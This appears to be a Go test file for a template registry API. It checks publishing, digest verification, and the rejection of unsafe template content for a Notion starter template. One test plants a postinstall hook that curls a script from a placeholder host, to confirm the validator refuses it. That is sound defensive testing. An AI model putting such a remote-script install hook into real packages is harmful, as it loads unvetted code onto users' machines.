package registryapi

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func validTestTemplateRequest(t *testing.T) PublishTemplateRequest {
	t.Helper()
	template := map[string]any{
		"schema":          "anip-starter-template/v0",
		"anipSpecVersion": "anip/0.24",
		"id":              "notion-fronting-starter",
		"kind":            "fronting_starter",
		"projectType":     "governed_service_project",
		"title":           "Notion Fronting Starter",
		"summary":         "Govern selected Notion operations.",
		"description":     "Starter template for Notion fronting.",
		"domain":          "notion",
		"documents": []any{
			map[string]any{
				"idSuffix": "intent",
				"title":    "Intent",
				"kind":     "business_intent",
				"filename": "intent.md",
				"content":  "# Intent\n\nGovern selected operations.",
			},
		},
		"connections": []any{
			map[string]any{
				"idSuffix":              "notion-api",
				"display_name":          "Notion API",
				"backend_kind":          "native_api",
				"system_kind":           "notion",
				"endpoint_ref":          "https://api.notion.com/v1",
				"auth_mode":             "service_delegated",
				"identity_provider_ref": "workspace-identity",
				"secret_ref":            "NOTION_TOKEN",
				"metadata":              map[string]any{},
			},
		},
		"discoveryRecords":   []any{},
		"capabilityMappings": []any{},
	}
	templateDigest, err := computeCanonicalDigest(template)
	if err != nil {
		t.Fatalf("template digest: %v", err)
	}
	manifest := map[string]any{
		"schema":            "anip-starter-template-manifest/v0",
		"template_id":       "notion-fronting-starter",
		"template_title":    "Notion Fronting Starter",
		"template_kind":     "fronting_starter",
		"package_version":   "0.1.0",
		"anip_spec_version": "anip/0.24",
		"studio_version":    "0.8.0",
		"template_digest":   templateDigest,
		"industry":          "saas",
		"systems":           []any{"notion"},
		"counts": map[string]any{
			"documents":           float64(1),
			"connections":         float64(1),
			"discovery_records":   float64(0),
			"capability_mappings": float64(0),
		},
	}
	return PublishTemplateRequest{
		TemplateID:      "notion-fronting-starter",
		TemplateVersion: "0.1.0",
		Manifest:        manifest,
		Template:        template,
		Package: map[string]any{
			"schema":          "anip-starter-template-package/v0",
			"package_kind":    "anip_starter_template",
			"package_version": "0.1.0",
			"manifest":        manifest,
			"template":        template,
		},
	}
}

func TestPublishTemplatePackage(t *testing.T) {
	store := NewMemoryStore()
	result, err := store.PublishTemplate(validTestTemplateRequest(t))
	if err != nil {
		t.Fatalf("PublishTemplate: %v", err)
	}
	if result.Template.TemplateID != "notion-fronting-starter" {
		t.Fatalf("unexpected template id %q", result.Template.TemplateID)
	}
	if result.Template.TemplateDigest == "" || result.Template.ManifestDigest == "" || result.Template.PackageDigest == "" {
		t.Fatalf("expected template digests, got %+v", result.Template)
	}
	items := store.ListTemplates()
	if len(items) != 1 || items[0].Domain != "notion" || items[0].Industry != "saas" {
		t.Fatalf("unexpected template list: %+v", items)
	}
}

func TestCanonicalDigestDoesNotHTMLEscapeTemplateContent(t *testing.T) {
	payload := map[string]any{
		"content": "POST /databases/{database_id}/query <safe>&review",
	}
	digest, err := computeCanonicalDigest(payload)
	if err != nil {
		t.Fatalf("computeCanonicalDigest: %v", err)
	}
	sum := sha256.Sum256([]byte(`{"content":"POST /databases/{database_id}/query <safe>&review"}`))
	expected := "sha256:" + hex.EncodeToString(sum[:])
	if digest != expected {
		t.Fatalf("expected non-HTML-escaped digest %s, got %s", expected, digest)
	}
}

func TestPublishTemplateRejectsNonMarkdownDocument(t *testing.T) {
	body := validTestTemplateRequest(t)
	document := body.Template["documents"].([]any)[0].(map[string]any)
	document["filename"] = "intent.pdf"
	body.Manifest["template_digest"], _ = computeCanonicalDigest(body.Template)

	if _, err := NewMemoryStore().PublishTemplate(body); err == nil || !strings.Contains(err.Error(), "safe Markdown .md filename") {
		t.Fatalf("expected non-Markdown rejection, got %v", err)
	}
}

func TestPublishTemplateRejectsTamperedDigest(t *testing.T) {
	body := validTestTemplateRequest(t)
	body.Manifest["template_digest"] = "sha256:0000000000000000000000000000000000000000000000000000000000000000"

	if _, err := NewMemoryStore().PublishTemplate(body); err == nil || !strings.Contains(err.Error(), "template_digest must match") {
		t.Fatalf("expected digest mismatch rejection, got %v", err)
	}
}

func TestPublishTemplateRejectsOldANIPSpecVersion(t *testing.T) {
	body := validTestTemplateRequest(t)
	body.Template["anipSpecVersion"] = "anip/0.23"
	body.Manifest["anip_spec_version"] = "anip/0.23"
	body.Manifest["template_digest"], _ = computeCanonicalDigest(body.Template)

	if _, err := NewMemoryStore().PublishTemplate(body); err == nil || !strings.Contains(err.Error(), "anipSpecVersion must be anip/0.24") {
		t.Fatalf("expected old anip spec version rejection, got %v", err)
	}
}

func TestPublishTemplateRejectsSecretValue(t *testing.T) {
	body := validTestTemplateRequest(t)
	connection := body.Template["connections"].([]any)[0].(map[string]any)
	connection["secret_ref"] = "plain-token-value"
	body.Manifest["template_digest"], _ = computeCanonicalDigest(body.Template)

	if _, err := NewMemoryStore().PublishTemplate(body); err == nil || !strings.Contains(err.Error(), "secret_ref must be an environment-style reference") {
		t.Fatalf("expected secret ref rejection, got %v", err)
	}
}

func TestPublishTemplateRejectsExecutableLookingFields(t *testing.T) {
	body := validTestTemplateRequest(t)
	body.Template["scripts"] = map[string]any{"postinstall": "curl https://example.invalid/script.sh"}
	body.Manifest["template_digest"], _ = computeCanonicalDigest(body.Template)

	if _, err := NewMemoryStore().PublishTemplate(body); err == nil || !strings.Contains(err.Error(), "executable-looking field") {
		t.Fatalf("expected executable-looking field rejection, got %v", err)
	}
}

func TestPublishTemplateRejectsUnknownEffectIDs(t *testing.T) {
	body := validTestTemplateRequest(t)
	body.Template["capabilityDefaults"] = map[string]any{
		"business_effects": map[string]any{
			"produces":         []any{"content.summary"},
			"does_not_produce": []any{"external_send"},
		},
	}
	body.Manifest["template_digest"], _ = computeCanonicalDigest(body.Template)

	if _, err := NewMemoryStore().PublishTemplate(body); err == nil || !strings.Contains(err.Error(), "unknown effect \"external_send\"") {
		t.Fatalf("expected unknown effect rejection, got %v", err)
	}
}

func TestTemplateHTTPPublishListDetailDownload(t *testing.T) {
	handler := NewHandlerWithOptions(NewMemoryStore(), HandlerOptions{
		PublishToken:                    "test-publish-token",
		LegacyGlobalPublishTokenEnabled: true,
	})
	payload, err := json.Marshal(validTestTemplateRequest(t))
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	req := httptest.NewRequest(http.MethodPost, "/registry-api/v1/templates", bytes.NewReader(payload))
	req.Header.Set("Authorization", "Bearer test-publish-token")
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	if rec.Code != http.StatusCreated {
		t.Fatalf("expected publish 201, got %d body=%s", rec.Code, rec.Body.String())
	}

	listReq := httptest.NewRequest(http.MethodGet, "/registry-api/v1/templates", nil)
	listRec := httptest.NewRecorder()
	handler.ServeHTTP(listRec, listReq)
	if listRec.Code != http.StatusOK {
		t.Fatalf("expected list 200, got %d", listRec.Code)
	}
	var listPayload struct {
		Items []TemplateSummary `json:"items"`
	}
	if err := json.Unmarshal(listRec.Body.Bytes(), &listPayload); err != nil {
		t.Fatalf("decode list: %v", err)
	}
	if len(listPayload.Items) != 1 || listPayload.Items[0].TemplateKind != "fronting_starter" {
		t.Fatalf("unexpected list payload %+v", listPayload.Items)
	}

	detailReq := httptest.NewRequest(http.MethodGet, "/registry-api/v1/templates/notion-fronting-starter/0.1.0", nil)
	detailRec := httptest.NewRecorder()
	handler.ServeHTTP(detailRec, detailReq)
	if detailRec.Code != http.StatusOK {
		t.Fatalf("expected detail 200, got %d", detailRec.Code)
	}

	downloadReq := httptest.NewRequest(http.MethodGet, "/registry-api/v1/templates/notion-fronting-starter/0.1.0/download", nil)
	downloadRec := httptest.NewRecorder()
	handler.ServeHTTP(downloadRec, downloadReq)
	if downloadRec.Code != http.StatusOK {
		t.Fatalf("expected download 200, got %d", downloadRec.Code)
	}
	if disposition := downloadRec.Header().Get("Content-Disposition"); !strings.Contains(disposition, ".anip-template.json") {
		t.Fatalf("expected template download disposition, got %q", disposition)
	}
}
